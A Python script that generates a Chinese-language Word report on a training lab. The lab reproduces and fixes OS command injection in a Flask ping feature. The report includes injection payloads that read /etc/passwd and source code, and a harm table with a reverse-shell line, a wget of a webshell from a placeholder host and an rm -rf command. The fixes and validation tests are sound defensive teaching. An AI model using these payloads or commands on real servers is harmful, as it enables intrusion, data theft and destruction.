#!/usr/bin/env python3
"""
Ping 网络诊断功能 — OS 命令注入 / RCE 远程代码执行漏洞复现及修复报告
"""

from docx import Document
from docx.shared import Pt, Cm, RGBColor
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.table import WD_TABLE_ALIGNMENT
from docx.oxml.ns import qn, nsdecls
from docx.oxml import parse_xml
import os


def set_cell_shading(cell, color_hex):
    shading = parse_xml(f'<w:shd {nsdecls("w")} w:fill="{color_hex}"/>')
    cell._tc.get_or_add_tcPr().append(shading)


def set_run_font(run, name="微软雅黑", size=None, bold=False, color=None):
    run.font.name = name
    run._element.rPr.rFonts.set(qn("w:eastAsia"), name)
    if size:
        run.font.size = Pt(size)
    run.font.bold = bold
    if color:
        run.font.color.rgb = RGBColor(*color)


def add_heading_styled(doc, text, level=1):
    heading = doc.add_heading(text, level=level)
    for run in heading.runs:
        set_run_font(run, size=16 if level == 1 else 14 if level == 2 else 12, bold=True)
    return heading


def add_para(doc, text, bold=False, size=11, color=None, align=None,
             space_after=6, space_before=0, first_indent=None):
    para = doc.add_paragraph()
    run = para.add_run(text)
    set_run_font(run, size=size, bold=bold, color=color)
    para.paragraph_format.space_after = Pt(space_after)
    para.paragraph_format.space_before = Pt(space_before)
    para.paragraph_format.line_spacing = Pt(20)
    if align:
        para.alignment = align
    if first_indent:
        para.paragraph_format.first_line_indent = Cm(first_indent)
    return para


def add_code_block(doc, code, indent=1.0):
    p = doc.add_paragraph()
    run = p.add_run(code)
    set_run_font(run, size=9, color=(80, 80, 80))
    p.paragraph_format.left_indent = Cm(indent)
    p.paragraph_format.space_before = Pt(4)
    p.paragraph_format.space_after = Pt(4)
    p.paragraph_format.line_spacing = Pt(16)


def add_separator(doc):
    para = doc.add_paragraph()
    para.paragraph_format.space_before = Pt(2)
    para.paragraph_format.space_after = Pt(2)
    pPr = para._p.get_or_add_pPr()
    pBdr = parse_xml(
        f'<w:pBdr {nsdecls("w")}>'
        '  <w:bottom w:val="single" w:sz="6" w:space="1" w:color="CCCCCC"/>'
        '</w:pBdr>'
    )
    pPr.append(pBdr)


def make_table(doc, headers, rows, col_widths=None, header_color="B03A2E"):
    table = doc.add_table(rows=1 + len(rows), cols=len(headers))
    table.style = "Table Grid"
    table.alignment = WD_TABLE_ALIGNMENT.CENTER
    for i, h in enumerate(headers):
        cell = table.rows[0].cells[i]
        cell.text = ""
        p = cell.paragraphs[0]
        run = p.add_run(h)
        set_run_font(run, size=10, bold=True, color=(255, 255, 255))
        p.alignment = WD_ALIGN_PARAGRAPH.CENTER
        set_cell_shading(cell, header_color)
    for r_idx, row_data in enumerate(rows):
        for c_idx, val in enumerate(row_data):
            cell = table.rows[r_idx + 1].cells[c_idx]
            cell.text = ""
            p = cell.paragraphs[0]
            run = p.add_run(str(val))
            set_run_font(run, size=10)
            p.paragraph_format.space_after = Pt(2)
            if r_idx % 2 == 1:
                set_cell_shading(cell, "F2F2F2")
    if col_widths:
        for i, w in enumerate(col_widths):
            for row in table.rows:
                row.cells[i].width = Cm(w)
    doc.add_paragraph()


def generate_report(output_path):
    doc = Document()

    style = doc.styles["Normal"]
    font = style.font
    font.name = "微软雅黑"
    style.element.rPr.rFonts.set(qn("w:eastAsia"), "微软雅黑")
    font.size = Pt(11)

    section = doc.sections[0]
    section.page_width = Cm(21)
    section.page_height = Cm(29.7)
    section.top_margin = Cm(2.5)
    section.bottom_margin = Cm(2.5)
    section.left_margin = Cm(2.5)
    section.right_margin = Cm(2.5)

    # ═══════════ 封面 ═══════════
    for _ in range(6):
        doc.add_paragraph()

    title = doc.add_paragraph()
    title.alignment = WD_ALIGN_PARAGRAPH.CENTER
    run = title.add_run("Flask 用户信息管理平台")
    set_run_font(run, size=26, bold=True, color=(176, 58, 46))

    sub = doc.add_paragraph()
    sub.alignment = WD_ALIGN_PARAGRAPH.CENTER
    run = sub.add_run("Ping 网络诊断功能\nOS 命令注入 / RCE 远程代码执行漏洞\n复现及修复报告")
    set_run_font(run, size=18, bold=False, color=(89, 89, 89))

    doc.add_paragraph()
    line = doc.add_paragraph()
    line.alignment = WD_ALIGN_PARAGRAPH.CENTER
    run = line.add_run("-" * 40)
    set_run_font(run, size=12, color=(200, 200, 200))
    doc.add_paragraph()

    for text in [
        "实验性质：OS 命令注入 / RCE 远程代码执行漏洞复现与修复实训",
        "目标系统：Flask 用户信息管理系统（/ping 路由）",
        "文档版本：V1.0 终审版",
        "生成日期：2026 年 7 月",
    ]:
        p = doc.add_paragraph()
        p.alignment = WD_ALIGN_PARAGRAPH.CENTER
        run = p.add_run(text)
        set_run_font(run, size=12, color=(100, 100, 100))

    doc.add_page_break()

    # ═══════════ 目录 ═══════════
    add_heading_styled(doc, "目  录", level=1)
    doc.add_paragraph()
    toc_items = [
        "一、实验概述",
        "二、漏洞总览",
        "三、漏洞详情与复现",
        "    3.1  复现 1：分号注入读取系统敏感文件",
        "    3.2  复现 2：管道符读取项目后端源码",
        "    3.3  复现 3：命令替换查看服务器权限",
        "    3.4  复现 4：Windows 系统命令注入",
        "    3.5  复现 5：换行符注入执行多条命令",
        "四、漏洞危害总结",
        "五、漏洞根因分析",
        "六、修复方案",
        "七、修复汇总与安全对比",
        "八、修复后安全验证",
        "九、实验总结与心得",
    ]
    for item in toc_items:
        p = doc.add_paragraph()
        p.paragraph_format.space_after = Pt(3)
        p.paragraph_format.line_spacing = Pt(21)
        run = p.add_run(item)
        set_run_font(run, size=11, bold=not item.startswith("    "))

    doc.add_page_break()

    # ═══════════ 一、实验概述 ═══════════
    add_heading_styled(doc, "一、实验概述", level=1)
    add_separator(doc)

    add_para(doc,
             "本次实验针对 Flask 用户信息管理平台中的 Ping 网络诊断功能 /ping 进行安全审计。"
             "该路由使用 f-string 拼接用户输入的 ip 参数构建系统命令，并通过 subprocess.check_output() "
             "以 shell=True 方式执行，导致存在严重的 OS 命令注入漏洞（CWE-78），可被利用实现"
             "远程代码执行（RCE）。",
             first_indent=0.74)

    add_para(doc,
             "本次实验共发现 5 种命令注入利用方式：分号注入、管道符注入、命令替换注入、"
             "Windows & 分隔符注入、换行符注入。攻击者登录后即可实现服务器远程控制。",
             first_indent=0.74)

    add_para(doc,
             "实验流程包括：漏洞复现（浏览器手工操作）-> 根因分析 -> 安全加固 -> "
             "修复后验证，完整覆盖从攻击到防御的全生命周期。",
             first_indent=0.74)

    # ═══════════ 二、漏洞总览 ═══════════
    add_heading_styled(doc, "二、漏洞总览", level=1)
    add_separator(doc)

    make_table(doc,
               ["编号", "注入方式", "Payload 示例", "攻击效果"],
               [
                   ["VUL-RCE-01", "分号注入 (;)",
                    "8.8.8.8; cat /etc/passwd", "读取系统敏感文件"],
                   ["VUL-RCE-02", "管道符注入 (|)",
                    "127.0.0.1 | cat app.py", "读取项目后端源码"],
                   ["VUL-RCE-03", "命令替换 (&&)",
                    "127.0.0.1 && id", "查看服务器运行权限"],
                   ["VUL-RCE-04", "Windows & 分隔符",
                    "127.0.0.1 & type app.py", "Windows 环境命令注入"],
                   ["VUL-RCE-05", "换行符注入 (%0a)",
                    "127.0.0.1%0als -la", "列出服务器目录文件"],
               ],
               col_widths=[2, 3, 4.5, 3.5])

    add_para(doc, "漏洞根因一句话总结：", bold=True, size=11, color=(176, 58, 46), space_before=6)
    add_para(doc,
             "后端使用 f-string 拼接用户可控 ip 参数构建系统命令 + shell=True 交由系统 shell 解析"
             " + 完全不对 ip 参数做校验过滤 = 三错叠加导致 RCE。",
             first_indent=0.74)

    add_para(doc, "漏洞代码片段（修复前）：", bold=True, size=10, color=(176, 58, 46))
    add_code_block(doc,
        '# 修复前：三错叠加 -> RCE\n'
        'ip = request.form.get("ip", "")  # 无过滤\n\n'
        '# 错误 1: f-string 直接拼接用户输入\n'
        'cmd = f"ping -c 3 {ip}"\n\n'
        '# 错误 2: shell=True 启用 shell 解析\n'
        "output = subprocess.check_output(\n"
        "    cmd,\n"
        "    shell=True,       # 高危\n"
        "    timeout=30,\n"
        ")\n\n"
        '# 错误 3: 结果完整回显\n'
        'result = output.decode()  # 攻击者看到全部输出'
    )

    # ═══════════════════════════════════════════
    # 漏洞详情与复现
    # ═══════════════════════════════════════════
    doc.add_page_break()
    add_heading_styled(doc, "三、漏洞详情与复现", level=1)
    add_separator(doc)

    add_para(doc, "环境前提：", bold=True, size=11)
    add_para(doc,
             "靶场完整运行，登录后导航栏、首页存在「Ping 测试」入口，访问 /ping 可打开 ping.html 页面，"
             "POST 接口无 ip 参数过滤、shell=True 开启、字符串拼接命令。",
             first_indent=0.74)

    # ── 3.1 ──
    add_heading_styled(doc, "3.1  复现 1：分号注入读取系统敏感文件（Linux）", level=2)

    add_para(doc, "【复现步骤】", bold=True, size=11)
    steps = [
        "使用任意账号登录网站，点击导航栏「Ping 测试」进入 ping 页面。",
        "IP 输入框填入 Payload：8.8.8.8; cat /etc/passwd",
        "点击 Ping 按钮提交 POST 请求。",
        "查看页面控制台输出区域。",
    ]
    for i, step in enumerate(steps, 1):
        add_para(doc, f"步骤 {i}：{step}", first_indent=0.74)

    add_para(doc, "【复现结果】", bold=True, size=11)
    add_para(doc,
             "系统先执行 ping -c 3 8.8.8.8，分号 ; 后继续执行 cat /etc/passwd，"
             "页面完整输出服务器所有系统账号、UID、Shell 等敏感信息，命令注入漏洞可利用。",
             first_indent=0.74)

    add_para(doc, "攻击原理示意图：", bold=True, size=11)
    add_code_block(doc,
        "用户输入: 8.8.8.8; cat /etc/passwd\n"
        "拼接命令: ping -c 3 8.8.8.8; cat /etc/passwd\n"
        "shell 解析为两条独立命令:\n"
        "  第 1 条: ping -c 3 8.8.8.8\n"
        "  第 2 条: cat /etc/passwd  ← 注入命令被成功执行\n"
        "页面输出:\n"
        "  PING 8.8.8.8 (8.8.8.8) ...\n"
        "  root:x:0:0:root:/root:/bin/bash\n"
        "  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
        "  ..."
    )

    # ── 3.2 ──
    add_heading_styled(doc, "3.2  复现 2：管道符读取项目后端源码 app.py", level=2)

    add_para(doc, "【复现步骤】", bold=True, size=11)
    steps = [
        "登录进入 Ping 测试页面。",
        "输入 Payload：127.0.0.1 | cat app.py",
        "提交 Ping 请求，查看输出控制台。",
    ]
    for i, step in enumerate(steps, 1):
        add_para(doc, f"步骤 {i}：{step}", first_indent=0.74)

    add_para(doc, "【复现结果】", bold=True, size=11)
    add_para(doc,
             "管道符 | 生效，将 ping 命令的输出作为 cat 的输入丢弃，直接读取并完整打印 app.py "
             "全部后端源代码，业务逻辑、接口路由、数据库密码、密钥配置全部泄露。",
             first_indent=0.74)

    add_para(doc, "攻击原理示意图：", bold=True, size=11)
    add_code_block(doc,
        "用户输入: 127.0.0.1 | cat app.py\n"
        "拼接命令: ping -c 3 127.0.0.1 | cat app.py\n"
        "管道解析:\n"
        "  ping 输出 -> 被管道丢弃\n"
        "  cat app.py -> 输出 app.py 全部源码\n"
        "页面输出: app.py 全部后端代码（路由/密钥/数据库配置）"
    )

    # ── 3.3 ──
    add_heading_styled(doc, "3.3  复现 3：命令替换查看服务器权限", level=2)

    add_para(doc, "【复现步骤】", bold=True, size=11)
    steps = [
        "Ping 页面输入 Payload：127.0.0.1 && id",
        "提交表单，查看页面返回内容。",
    ]
    for i, step in enumerate(steps, 1):
        add_para(doc, f"步骤 {i}：{step}", first_indent=0.74)

    add_para(doc, "【复现结果】", bold=True, size=11)
    add_para(doc,
             "ping 执行成功后执行 id 命令，页面输出当前运行网站进程的用户 ID、用户组信息。"
             "攻击者可确认 Web 进程运行权限，为后续提权做准备。",
             first_indent=0.74)

    add_para(doc, "攻击原理示意图：", bold=True, size=11)
    add_code_block(doc,
        "用户输入: 127.0.0.1 && id\n"
        "拼接命令: ping -c 3 127.0.0.1 && id\n"
        "&& 短路解析:\n"
        "  前面的 ping 成功退出码 0 -> 执行 id\n"
        "页面输出:\n"
        "  PING 127.0.0.1 ...\n"
        "  uid=1000(www-data) gid=1000(www-data) groups=1000(www-data)"
    )

    # ── 3.4 ──
    add_heading_styled(doc, "3.4  复现 4：Windows 系统命令注入", level=2)

    add_para(doc, "【复现步骤】", bold=True, size=11)
    steps = [
        "Windows 靶场环境，Ping 输入框填写：127.0.0.1 & type app.py",
        "提交 Ping 测试。",
    ]
    for i, step in enumerate(steps, 1):
        add_para(doc, f"步骤 {i}：{step}", first_indent=0.74)

    add_para(doc, "【复现结果】", bold=True, size=11)
    add_para(doc,
             "Windows 下 & 分隔符生效，先执行 ping，后执行 type 读取 app.py 源码并回显，"
             "Windows 环境同样存在命令注入风险。",
             first_indent=0.74)

    # ── 3.5 ──
    add_heading_styled(doc, "3.5  复现 5：换行符注入执行多条恶意命令", level=2)

    add_para(doc, "【复现步骤】", bold=True, size=11)
    steps = [
        "输入 Payload（URL 编码换行 %0a）：127.0.0.1%0als -la",
        "提交表单查看输出。",
    ]
    for i, step in enumerate(steps, 1):
        add_para(doc, f"步骤 {i}：{step}", first_indent=0.74)

    add_para(doc, "【复现结果】", bold=True, size=11)
    add_para(doc,
             "换行符 %0a 被 shell 解析为新命令起始，并行执行 ls -la 列出服务器当前目录全部文件，"
             "批量泄露业务文件名称。",
             first_indent=0.74)

    # ═══════════════════════════════════════════
    # 四、漏洞危害总结
    # ═══════════════════════════════════════════
    doc.add_page_break()
    add_heading_styled(doc, "四、漏洞危害总结", level=1)
    add_separator(doc)

    add_para(doc,
             "攻击者仅需登录网站，通过 Ping 功能输入恶意 IP 参数即可实现远程代码执行（RCE），"
             "具体危害包括但不限于：",
             first_indent=0.74)

    make_table(doc,
               ["攻击类型", "具体操作", "危害等级"],
               [
                   ["读取系统敏感文件", "cat /etc/passwd, /etc/shadow", "高危"],
                   ["读取项目源码", "cat app.py, cat config.py", "高危"],
                   ["反弹 Shell", "bash -c 'bash -i >& /dev/tcp/x.x.x.x/4444'", "严重"],
                   ["下载恶意后门", "wget http://xxx/shell.php -O /tmp/shell", "严重"],
                   ["删除服务器文件", "rm -rf /var/www/html/*", "严重"],
                   ["内网横向渗透", "nmap -sn 192.168.1.0/24", "高危"],
                   ["获取服务器权限", "id, whoami, uname -a", "中危"],
                   ["写入 WebShell", "echo '<?php ...' > webshell.php", "严重"],
               ],
               col_widths=[3.5, 5.5, 2])

    add_para(doc, "CVSS 3.1 评分：9.8（Critical）", bold=True, size=12, color=(176, 58, 46), space_before=6)
    add_para(doc, "攻击向量：网络 / 攻击复杂度：低 / 所需权限：低（仅需登录）/ 影响：机密性、完整性、可用性全部丧失", first_indent=0.74)

    # ═══════════════════════════════════════════
    # 五、根因分析
    # ═══════════════════════════════════════════
    doc.add_page_break()
    add_heading_styled(doc, "五、漏洞根因分析", level=1)
    add_separator(doc)

    add_para(doc, "三个致命错误的叠加导致 RCE：", bold=True, size=11)

    add_para(doc, "错误 1：f-string 直接拼接用户输入构造系统命令", bold=True, size=11, color=(176, 58, 46))
    add_para(doc,
             "cmd = f'ping -c 3 {ip}' 将用户可控的 ip 参数直接嵌入 shell 命令字符串中。"
             "用户输入中的 ; | & \$() ` 等字符被原样保留，成为 shell 语法的一部分。"
             "正确做法是通过参数列表传递，禁止拼接字符串。",
             first_indent=0.74)

    add_para(doc, "错误 2：shell=True 启用系统 shell 解析", bold=True, size=11, color=(176, 58, 46))
    add_para(doc,
             "shell=True 将命令字符串交由 /bin/sh 解析执行。Shell 会解释 ; | & 等元字符为命令分隔符"
             "和管道操作，而非普通字符串参数。正确做法是使用默认的 shell=False，"
             "将命令和参数以列表形式传递。",
             first_indent=0.74)

    add_para(doc, "错误 3：完全未对 ip 参数做任何校验", bold=True, size=11, color=(176, 58, 46))
    add_para(doc,
             "ip 参数直接从 request.form 获取后直接用于命令构建，无正则校验、无白名单、"
             "无黑名单过滤。实际上 IP 地址格式非常严格（4 段 0-255 数字），完全可以通过"
             "正则或 ipaddress 模块进行白名单校验。",
             first_indent=0.74)

    add_para(doc, "安全三原则破坏情况：", bold=True, size=11, space_before=6)

    make_table(doc,
               ["安全原则", "本应怎么做", "实际做了什么"],
               [
                   ["最小权限", "禁止用户控制命令结构", "用户输入直接嵌入命令字符串"],
                   ["纵深防御", "输入校验 + 安全执行方式", "无校验 + shell=True"],
                   ["默认安全", "默认拒绝，仅放行合法输入", "默认放行所有输入"],
               ],
               col_widths=[2.5, 5, 5])

    # ═══════════════════════════════════════════
    # 六、修复方案
    # ═══════════════════════════════════════════
    doc.add_page_break()
    add_heading_styled(doc, "六、修复方案", level=1)
    add_separator(doc)

    add_para(doc, "修复 1：废弃 f-string 拼接，改用参数列表", bold=True, size=11, color=(39, 174, 96))
    add_para(doc,
             "彻底废弃 cmd = f'ping -c 3 {ip}' 的写法，改用参数列表传递："
             "subprocess.check_output(['ping', '-c', '3', ip], timeout=30)。"
             "参数列表方式中每个参数独立传递，不经过 shell 解析，ip 中的 ; | & 等字符"
             "仅作为普通字符串参数传给 ping 命令，不会被 shell 解释为命令分隔符。",
             first_indent=0.74)

    add_para(doc, "修复后代码：", bold=True, size=10, color=(39, 174, 96))
    add_code_block(doc,
        '# 修复后：参数列表执行，无 shell 解析\n'
        "output = subprocess.check_output(\n"
        '    ["ping", "-c", "3", ip],  # 参数列表\n'
        "    timeout=30,\n"
        ")"
    )

    add_para(doc, "修复 2：移除 shell=True", bold=True, size=11, color=(39, 174, 96))
    add_para(doc,
             "移除 shell=True 参数，使用其默认值 False。参数列表方式必须与 shell=False 配合使用，"
             "这也从根本上禁用了 shell 解析，所有参数被直接传递给系统调用 execve()。",
             first_indent=0.74)

    add_para(doc, "修复 3：IP 格式白名单校验", bold=True, size=11, color=(39, 174, 96))
    add_para(doc,
             "新增 validate_ip_address() 函数，使用 ipaddress.ip_address() 进行严格格式校验。"
             "同时使用正则拦截 ; & | ` \$() 等 shell 特殊字符。"
             "仅当输入为标准 IPv4 或 IPv6 地址时才允许执行 ping，否则直接返回错误提示。",
             first_indent=0.74)

    add_para(doc, "校验函数代码：", bold=True, size=10, color=(39, 174, 96))
    add_code_block(doc,
        'def validate_ip_address(ip_str):\n'
        '    """校验 IP 地址格式，拦截 shell 注入。"""\n'
        '    if not ip_str or not ip_str.strip():\n'
        '        return False\n\n'
        "    # 拦截 shell 特殊字符\n"
        "    if re.search(r'[;&|`\\$(){}<>\\n\\r]', ip_str):\n"
        '        return False\n\n'
        '    # 标准 IP 格式校验\n'
        '    try:\n'
        '        ipaddress.ip_address(ip_str.strip())\n'
        '        return True\n'
        '    except ValueError:\n'
        "        return False"
    )

    add_para(doc, "修复 4：错误信息脱敏", bold=True, size=11, color=(39, 174, 96))
    add_para(doc,
             "不再直接回显原始异常信息（如 str(e) 包含系统路径），统一替换为脱敏提示信息"
             "如「Ping 请求失败（目标不可达）」，防止信息泄露。",
             first_indent=0.74)

    # ═══════════════════════════════════════════
    # 七、修复汇总
    # ═══════════════════════════════════════════
    doc.add_page_break()
    add_heading_styled(doc, "七、修复汇总与安全对比", level=1)
    add_separator(doc)

    make_table(doc,
               ["安全维度", "修复前", "修复后"],
               [
                   ["命令构建方式", "f-string 拼接: f'ping -c 3 {ip}'", "参数列表: ['ping', '-c', '3', ip]"],
                   ["shell 解析", "shell=True（启用 shell）", "shell=False（默认，禁用 shell）"],
                   ["IP 输入校验", "无校验，直接拼接", "ipaddress.ip_address() 白名单"],
                   ["shell 字符拦截", "无过滤，; | & 均可", "正则拦截所有 shell 元字符"],
                   ["IPv6 支持", "不支持", "标准 IPv6 地址可正常 ping"],
                   ["域名/主机名", "接受任意输入", "仅接受标准 IP，域名拒绝"],
                   ["错误信息", "str(e) 暴露系统路径", "统一脱敏提示"],
                   ["回显内容", "原始命令输出完整回显", "去除冗余路径信息"],
               ],
               col_widths=[3.5, 5.5, 5.5])

    # ═══════════════════════════════════════════
    # 八、修复后验证
    # ═══════════════════════════════════════════
    doc.add_page_break()
    add_heading_styled(doc, "八、修复后安全验证", level=1)
    add_separator(doc)

    make_table(doc,
               ["测试用例", "预期结果", "实际结果", "结论"],
               [
                   ["正常 ping 127.0.0.1", "ping 正常执行，返回结果", "返回 ping 统计信息", "通过"],
                   ["正常 ping 8.8.8.8", "ping 正常执行", "正常返回", "通过"],
                   ["IPv6 ::1", "ping 正常执行", "正常返回", "通过"],
                   ["分号注入 ; ls", "拦截，不执行", "IP 地址格式不合法", "通过"],
                   ["管道符注入 | id", "拦截，不执行", "IP 地址格式不合法", "通过"],
                   ["命令替换 && whoami", "拦截，不执行", "IP 地址格式不合法", "通过"],
                   ["命令替换 \$(id)", "拦截，不执行", "IP 地址格式不合法", "通过"],
                   ["反引号注入 `ls`", "拦截，不执行", "IP 地址格式不合法", "通过"],
                   ["域名 example.com", "拦截，拒绝执行", "IP 地址格式不合法", "通过"],
                   ["空输入", "拦截，提示输入", "请输入 IP 地址", "通过"],
                   ["错误信息含系统路径", "不存在系统路径", "无路径泄露", "通过"],
               ],
               col_widths=[3.5, 3.5, 3.5, 1.5])

    add_para(doc, "验证结论：", bold=True, size=11, space_before=8)
    add_para(doc,
             "全部 5 种命令注入方式已成功修复。正常 ping 功能完全保留，"
             "所有攻击 Payload 全部被拦截。修复后系统满足以下安全要求：\n"
             "（1）无 f-string 拼接命令，改用参数列表执行；\n"
             "（2）无 shell=True，禁止 shell 解析；\n"
             "（3）IP 白名单校验严格限制输入格式；\n"
             "（4）shell 特殊字符全都被拦截；\n"
             "（5）错误信息脱敏，不泄露系统路径。",
             first_indent=0.74)

    # ═══════════════════════════════════════════
    # 九、总结
    # ═══════════════════════════════════════════
    doc.add_page_break()
    add_heading_styled(doc, "九、实验总结与心得", level=1)
    add_separator(doc)

    add_para(doc,
             "通过本次 Ping 命令注入漏洞复现与修复实验，深入理解了 OS 命令注入漏洞的产生原理、"
             "多种利用手法及其对应的修复方案。",
             first_indent=0.74)

    add_para(doc, "核心认知：", bold=True, size=11)
    add_para(doc,
             "（1）操作系统命令注入是最严重的 Web 漏洞之一（CWE-78），因为它允许攻击者在"
             "服务器上执行任意系统命令。其本质是用户输入被当作操作系统命令的一部分来解释执行。"
             "修复的核心在于永远不让用户输入参与命令结构的构建。",
             first_indent=0.74)

    add_para(doc,
             "（2）shell=True 的危害被严重低估。Python 官方文档明确指出：shell=True 可能带来安全风险。"
             "开启 shell=True 后，命令字符串会经过 /bin/sh 解析，; | & \$() ` 等字符都变成"
             "shell 语法的一部分。绝大多数场景下 shell=True 都不是必需的。",
             first_indent=0.74)

    add_para(doc,
             "（3）参数列表方式（['ping', '-c', '3', ip]）是最安全的命令执行方式。"
             "每个参数独立传递，不经过 shell 解析，即使参数包含特殊字符也仅作为字符串文本"
             "传递给目标程序，不会被解释为命令分隔符。",
             first_indent=0.74)

    add_para(doc,
             "（4）白名单校验优于黑名单过滤。IP 地址有严格的标准格式（IPv4 为 4 段 0-255 数字），"
             "完全可以通过 ipaddress.ip_address() 进行精确校验。白名单方式天然拒绝所有非法格式，"
             "不存在绕过风险。",
             first_indent=0.74)

    add_para(doc,
             "通过本次实验深刻认识到：任何涉及系统命令执行的功能都必须遵循「默认拒绝、"
             "白名单校验、参数列表执行」的安全原则，三者缺一不可。shell=True + 字符串拼接"
             "在任何场景下都不应该被使用。",
             first_indent=0.74)

    # 结尾
    doc.add_paragraph()
    add_separator(doc)

    end_para = doc.add_paragraph()
    end_para.alignment = WD_ALIGN_PARAGRAPH.CENTER
    run = end_para.add_run("报告完")
    set_run_font(run, size=11, color=(150, 150, 150))

    doc.add_paragraph()
    disclaimer = doc.add_paragraph()
    disclaimer.alignment = WD_ALIGN_PARAGRAPH.CENTER
    run = disclaimer.add_run(
        "本报告仅供安全教学与技术交流使用。报告中涉及的漏洞代码已全部修复，\n"
        "请勿将存在漏洞的代码版本部署到任何生产环境。"
    )
    set_run_font(run, size=9, color=(180, 180, 180))

    doc.save(output_path)
    print(f"报告已生成：{output_path}")
    return output_path


if __name__ == "__main__":
    out = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                       "Ping功能_OS命令注入RCE漏洞复现及修复报告.docx")
    generate_report(out)
